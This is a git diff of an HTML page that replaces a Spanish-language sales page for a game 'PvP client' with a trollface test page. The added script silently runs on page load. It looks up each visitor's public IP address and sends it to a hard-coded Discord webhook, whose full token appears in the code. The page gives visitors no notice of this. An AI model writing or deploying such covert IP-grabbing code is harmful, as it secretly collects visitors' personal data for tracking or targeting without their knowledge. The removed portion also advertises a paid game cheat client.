@@ -3,90 +3,50 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Gym Client</title>
-    <style>
-        body {
-            margin: 0;
-            padding: 20px;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            min-height: 100vh;
-            background: url('URL_PERMANENTE_DE_LA_IMAGEN') no-repeat center center fixed;
-            background-size: cover;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-
-        .container {
-            background: rgba(0, 0, 0, 0.8);
-            padding: 2rem;
-            border-radius: 15px;
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
-            max-width: 600px;
-            width: 100%;
-            color: white;
-            backdrop-filter: blur(10px);
-        }
-
-        .product-image {
-            width: 100%;
-            max-width: 400px;
-            height: auto;
-            border-radius: 10px;
-            margin: 1rem 0;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
-            transition: transform 0.3s ease;
-        }
-
-        .product-image:hover {
-            transform: scale(1.02);
-        }
-
-        .buy-button {
-            background: linear-gradient(45deg, #4CAF50, #45a049);
-            color: white;
-            border: none;
-            padding: 1rem 2rem;
-            font-size: 1.1rem;
-            font-weight: bold;
-            border-radius: 8px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            width: 100%;
-            max-width: 300px;
-            margin-top: 1rem;
-        }
-
-        .buy-button:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 4px 12px rgba(76, 175, 80, 0.3);
-        }
-    </style>
+    <title>ASDForum</title>
 </head>
 <body>
-    <div class="container">
-        <h1>Gym Client</h1>
-        <p class="price-tag">$15.00 USD</p>
-        <p>Gym Client, uno de los mejores clientes para pvp y utilidades en el mercado, cómpralo a tan solo 15 dólares.</p>
-        <img class="product-image" src="URL_PERMANENTE_DE_LA_IMAGEN" alt="Gym Client" loading="lazy">
-        
-        <h2>Características:</h2>
-        <ul>
-            <li>Combat</li>
-            <li>Player</li>
-            <li>Render</li>
-            <li>Movement</li>
-            <li>Misc</li>
-        </ul>
+    <h1>pruebav1 githubpage</h1>
 
-        <button id="checkout-button" class="buy-button">Comprar Ahora</button>
-    </div>
+  
+    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRY7OOhDZDaP6YS-tOd1A0ArdgqOVAmQteIkQ&s" alt="Trollface" style="width: 300px; height: auto;">
 
     <script>
-        const paypalLink = 'https://www.paypal.com/paypalme/Pachz22?country.x=AR&locale.x=es_XC';
-        document.getElementById('checkout-button').addEventListener('click', function () {
-            window.open(paypalLink, '_blank');
-        });
+
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+
+                const userIP = data.ip;
+                console.log("La IP pública es: ", userIP);
+
+                const discordWebhookURL = 'https://discord.com/api/webhooks/1348742741399703552/DlwWcZfNX9bbgi2vH2MskQI4vjXIa7vZXFYLQlj8q8h1TXNLSgPnpp2TNCsHAy46xHgh';
+
+                const payload = {
+                    content: `¡Alguien visitó tu página! La IP es: ${userIP}`
+                };
+
+                fetch(discordWebhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload)
+                })
+                .then(response => {
+                    if (response.ok) {
+                        console.log("IP enviada correctamente a Discord.");
+                    } else {
+                        console.error("Hubo un error al enviar la IP.");
+                    }
+                })
+                .catch(error => {
+                    console.error("Error al enviar la IP a Discord: ", error);
+                });
+            })
+            .catch(error => {
+                console.error("Error al obtener la IP pública: ", error);
+            });
     </script>
 </body>
 </html>
